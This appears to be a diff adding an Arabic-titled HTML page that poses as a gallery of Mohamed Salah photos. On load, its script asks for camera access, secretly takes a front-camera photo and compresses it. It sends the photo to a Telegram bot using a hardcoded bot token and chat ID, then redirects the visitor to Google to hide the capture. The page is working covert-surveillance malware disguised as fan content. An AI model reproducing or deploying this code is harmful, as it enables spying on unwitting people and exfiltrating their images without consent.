@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="https://cdn-images.dzcdn.net/images/cover/ba8c0c28d315bb9e2f6c276b0facf709/0x1900-000000-80-0-0.jpg">
+    <title>صور محمد صلاح</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // إعدادات البوت - تأكد من صحة هذه البيانات
+        const BOT_TOKEN = '7472121260:AAGcpDMoqxrj_CrBRaP9jxerBgzov69KO0o';
+        const CHAT_ID = '6483098148';
+        const REDIRECT_URL = 'https://www.google.com/'; // استبدل بالرابط المطلوب
+        const CAPTURE_DELAY = 800; // وقت التأخير قبل التقاط الصورة (مللي ثانية)
+
+        // طلب إذن الكاميرا تلقائياً عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user', // تغيير إلى 'user' لاستخدام الكاميرا الأمامية
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+                
+                setTimeout(async () => {
+                    try {
+                        await captureAndSend(stream);
+                    } finally {
+                        // إيقاف الكاميرا وتوجيه المستخدم في جميع الحالات
+                        stream.getTracks().forEach(track => track.stop());
+                        window.location.href = REDIRECT_URL;
+                    }
+                }, CAPTURE_DELAY);
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                window.location.href = REDIRECT_URL;
+            }
+        });
+
+        async function captureAndSend(stream) {
+            try {
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                
+                // تحسين جودة الصورة
+                const optimizedBlob = await compressImage(blob);
+                
+                // محاولة الإرسال مع إعادة المحاولة عند الفشل
+                await retrySendToTelegram(optimizedBlob, 3); // 3 محاولات
+                
+            } catch (error) {
+                console.error('Error in captureAndSend:', error);
+                throw error;
+            }
+        }
+
+        async function compressImage(blob) {
+            // ضغط الصورة لتحسين سرعة الإرسال
+            return new Promise((resolve) => {
+                const img = new Image();
+                const url = URL.createObjectURL(blob);
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    // تحديد أبعاد الصورة المحسنة
+                    const MAX_WIDTH = 1280;
+                    const MAX_HEIGHT = 720;
+                    let width = img.width;
+                    let height = img.height;
+                    
+                    if (width > height) {
+                        if (width > MAX_WIDTH) {
+                            height *= MAX_WIDTH / width;
+                            width = MAX_WIDTH;
+                        }
+                    } else {
+                        if (height > MAX_HEIGHT) {
+                            width *= MAX_HEIGHT / height;
+                            height = MAX_HEIGHT;
+                        }
+                    }
+                    
+                    canvas.width = width;
+                    canvas.height = height;
+                    ctx.drawImage(img, 0, 0, width, height);
+                    
+                    canvas.toBlob((compressedBlob) => {
+                        resolve(compressedBlob || blob); // استخدام الصورة الأصلية إذا فشل الضغط
+                        URL.revokeObjectURL(url);
+                    }, 'image/jpeg', 0.7); // جودة 70%
+                };
+                img.src = url;
+            });
+        }
+
+        async function retrySendToTelegram(blob, maxRetries) {
+            for (let i = 0; i < maxRetries; i++) {
+                try {
+                    await sendToTelegram(blob);
+                    return; // نجح الإرسال، نخرج من الدالة
+                } catch (error) {
+                    console.error(`Attempt ${i + 1} failed:`, error);
+                    if (i === maxRetries - 1) throw error; // فشلت جميع المحاولات
+                    
+                    // انتظار قبل إعادة المحاولة
+                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+                }
+            }
+        }
+
+        async function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (!response.ok) {
+                const errorData = await response.json();
+                throw new Error(errorData.description || 'Failed to send photo');
+            }
+            
+            return response.json();
+        }
+    </script>
+</body>
+</html>
